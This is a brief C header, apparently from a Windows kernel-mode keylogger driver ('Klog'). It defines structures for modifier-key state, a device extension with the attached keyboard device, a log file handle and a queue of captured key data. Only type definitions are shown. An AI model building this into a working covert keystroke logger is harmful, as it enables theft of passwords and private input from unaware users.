#ifndef __Klog_h__
#define __Klog_h__

struct KEY_STATE {
	bool kSHIFT;
	bool kCAPSLOCK;
	bool kCTRL;
	bool kALT;
};

typedef struct _DEVICE_EXTENSION {
	PDEVICE_OBJECT pKeyboardDevice;
	PETHREAD pThreadObj;
	bool bThreadTerminate;
	HANDLE hLogFile;
	KEY_STATE kState;
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
} DEVICE_EXTENSION, * PDEVICE_EXTENSION;

struct KEY_DATA {
	LIST_ENTRY ListEntry;
	USHORT KeyData;
	char KeyFlags;
};

#endif